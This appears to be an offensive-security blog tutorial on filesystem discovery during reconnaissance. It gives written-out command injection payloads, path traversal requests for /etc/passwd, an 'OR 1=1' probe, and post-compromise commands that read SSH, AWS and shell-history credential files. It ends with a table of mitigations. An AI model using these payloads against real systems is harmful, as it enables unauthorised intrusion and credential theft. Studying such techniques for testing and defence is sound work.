---
title: "Methods: Filesystem Discovery Techniques for Reconnaissance"
date: 2026-03-05
author: ESTHER
tags:
  - OSINT
  - Reconnaissance
  - Filesystem Enumeration
  - Command Injection
  - Methodology
categories:
  - Methods
  - Offensive Security
---

## Introduction

File and directory discovery (T1083) is a core reconnaissance technique. This post documents practical methods for enumerating filesystems, from passive information gathering to active command execution.

## Method 1: Passive Information Gathering

### 1.1 Web Crawling and Sitemap Analysis

**Objective:** Identify publicly accessible files and directory structure

**Tools:**
- `curl` / `wget` — Fetch pages and analyze links
- `robots.txt` — Check for directory hints
- `sitemap.xml` — Public directory mapping

**Example:**

```bash
# Fetch robots.txt for directory hints
curl -s https://target.com/robots.txt

# Parse sitemap for accessible paths
curl -s https://target.com/sitemap.xml | grep -oP '<loc>\K[^<]*'
```

**Output:** `/admin/`, `/api/`, `/backup/`, `/uploads/`

### 1.2 DNS and Subdomain Enumeration

**Objective:** Identify secondary servers that may host files

**Tools:**
- `dig` — DNS queries
- `nslookup` — DNS resolution
- `Amass` — Subdomain mapping
- `theHarvester` — Email and host discovery

**Example:**

```bash
# Find subdomains
amass enum -d example.com

# DNS zone transfer attempt
dig @ns1.example.com example.com axfr

# Reverse DNS lookup
dig -x 192.0.2.1
```

### 1.3 Search Engine Dorking

**Objective:** Find indexed files and directories

**Techniques:**

```
site:example.com filetype:pdf          # PDFs on target
site:example.com filetype:sql           # SQL files
site:example.com filetype:backup        # Backups
site:example.com "admin"                # Admin paths
site:example.com inurl:/private         # Private directories
```

**Impact:** Identifies publicly indexed sensitive files (config backups, PDFs with metadata, etc.)

## Method 2: Active Filesystem Enumeration

### 2.1 Command Injection

**Objective:** Execute commands on target to list files

**Prerequisite:** Unvalidated input passed to system calls (DVWA example)

**Common Injection Points:**
- URL parameters
- POST form fields
- HTTP headers
- File upload names
- Search input

**Exploitation Steps:**

```bash
# Test for vulnerability
curl "http://target/ping.php?ip=127.0.0.1; whoami"

# List root
curl "http://target/exec.php?cmd=ls+-la+/"

# Enumerate specific paths
curl "http://target/exec.php?cmd=find+/var/www+-type+f+-name+'*.php'"
```

**Command Sequences for Discovery:**

| Goal | Command | Purpose |
|------|---------|---------|
| Current location | `pwd` | Understand execution context |
| Root directory | `ls -la /` | Identify major partitions |
| Web root | `ls -laR /var/www` | Map web application structure |
| Configuration | `find / -name '*.conf' 2>/dev/null` | Locate config files |
| Database | `find / -name '*.sql' -o -name '*.db'` | Locate data |
| Writable dirs | `find / -type d -writable 2>/dev/null` | Persistence points |
| User home | `ls -la /home` | Identify system users |
| Backups | `find / -name '*.bak' -o -name '*.backup'` | Find unprotected backups |

### 2.2 File Path Traversal

**Objective:** Access files outside intended directory

**Vulnerability Pattern:**

```php
// VULNERABLE
$file = $_GET['file'];
include("uploads/" . $file);

// Payload: ?file=../../../../etc/passwd
```

**Discovery Application:**

```bash
# Traverse to sensitive files
curl "http://target/download.php?file=../../../etc/passwd"

# Enumerate parent directories
curl "http://target/view.php?file=../../config/database.yml"
```

### 2.3 Directory Brute Force

**Objective:** Guess common directory names

**Tools:**
- `gobuster` — Directory and DNS brute forcing
- `dirsearch` — Web path scanner
- `wfuzz` — Web fuzzer
- `ffuf` — Fast fuzzer

**Wordlists:**
- SecLists `/Discovery/Web-Content/`
- Custom based on application type

**Example:**

```bash
# Brute force directories
gobuster dir -u http://localhost:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

# Brute force with extensions
gobuster dir -u http://target -w wordlist.txt -x .php,.html,.txt,.conf

# Specific pattern fuzzing
wfuzz -c -z file,wordlist.txt http://target/FUZZ/
```

**Common Directories Found:**

- `/admin/` — Administration interfaces
- `/uploads/` — User file storage
- `/backup/` — Backup files
- `/config/` — Configuration files
- `/private/` — Restricted access
- `/.git/` — Git repositories
- `/.env` — Environment files
- `/api/` — API endpoints

## Method 3: Error-Based Discovery

### 3.1 Verbose Error Messages

**Objective:** Leverage application errors to reveal paths

**Trigger Strategies:**

```bash
# PHP errors may reveal file paths
curl "http://target/index.php?invalid=1"

# Database errors
curl "http://target/search.php?id=999999 OR 1=1"

# File inclusion errors
curl "http://target/page.php?file=/nonexistent"
```

**Output Example:**

```
Warning: include(/var/www/html/pages/about.php): Failed to open stream...
  in /var/www/html/index.php on line 42
```

**Extracted Information:**
- Base path: `/var/www/html/`
- Module structure: `/pages/` subdirectory
- Web server user: Apache/www-data

### 3.2 Stack Traces

**Objective:** Capture full file paths in exception traces

**Triggers:**
- Unhandled exceptions
- Type errors
- Access violations
- Null pointer dereferences

**Output Analysis:**

```
java.io.FileNotFoundException: /opt/tomcat/webapps/myapp/config.properties
    at com.example.App.load(App.java:42)
    at com.example.Main.main(Main.java:15)
```

**Extracted Information:**
- Application root: `/opt/tomcat/webapps/myapp/`
- Configuration file: `config.properties`
- Source code: `App.java:42`

## Method 4: Metadata Analysis

### 4.1 Document Metadata

**Objective:** Extract path and system information from documents

**Tools:**
- `exiftool` — EXIF and document metadata
- `pdfinfo` — PDF analysis
- `strings` — String extraction from binaries

**Example:**

```bash
# Extract PDF creator and dates
exiftool document.pdf

# Find full paths in compiled binaries
strings /usr/bin/app | grep "/home\|/etc\|/var"

# MS Office document inspection
unzip -l document.docx | grep -i "path\|config"
```

**Common Findings:**
- Original file paths (C:\Users\username\Documents\...)
- Server paths (/home/developer/projects/...)
- Internal hostnames
- Timestamps (modification dates, creation dates)

### 4.2 HTTP Headers and Fingerprinting

**Objective:** Identify server paths from response headers

**Analysis:**

```bash
# Capture headers
curl -I https://target.com

# Look for:
Server: Apache/2.4.41 (Ubuntu)      # Version/OS info
X-Powered-By: PHP/7.4              # Technology stack
Location: /new/location             # Path disclosure
```

## Method 5: Automated Discovery Tools

### 5.1 Spider / Crawler Approach

**Tools:**
- `Burp Suite` — Passive and active crawling
- `ZAP` — Web app scanner
- `Nikto` — Web server scanner

**Features:**
- JavaScript execution and dynamic content discovery
- Form and parameter enumeration
- Cookie/session handling
- Automatic fingerprinting

### 5.2 OSINT Framework Integration

**Tools:**
- Recon-ng
- SpiderFoot
- Maltego

**Workflow:**

```
Domain → Subdomains → Web Crawl → Path Discovery → File Analysis
```

## Method 6: Local Privilege Escalation (Post-Compromise)

### 6.1 Hidden File Discovery

**Objective:** Find sensitive files in compromised account

**Commands:**

```bash
# Find all hidden files
find ~ -name ".*" -type f 2>/dev/null

# Look for credentials in common locations
cat ~/.bash_history ~/.ssh/config ~/.aws/credentials

# Search for recent files
find ~ -type f -mtime -7 2>/dev/null | head -20
```

### 6.2 SUID/SGID Enumeration

**Objective:** Identify privilege escalation vectors

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Search for misconfigured sudo permissions
sudo -l
```

## Defensive Mitigations

| Technique | Mitigation |
|-----------|-----------|
| Command Injection | Input validation, escapeshellarg(), parameterized calls |
| Path Traversal | Whitelist allowed paths, realpath() validation |
| Directory Brute Force | Rate limiting, WAF rules, non-standard paths |
| Error Messages | Generic error pages, log details internally |
| Metadata Disclosure | Remove metadata from public documents, disable server signatures |
| Web Crawling | robots.txt controls, authentication, rate limiting |

## Conclusion

Filesystem discovery is a multi-stage process combining passive information gathering, active enumeration, and error exploitation. A comprehensive reconnaissance approach uses all these methods to build a complete picture of the target environment.

---

**Techniques Covered:** 6 primary methods + 12+ sub-techniques  
**Tool Count:** 20+ tools referenced  
**MITRE ATT&CK:** T1083 File and Directory Discovery  
**Difficulty:** Intermediate
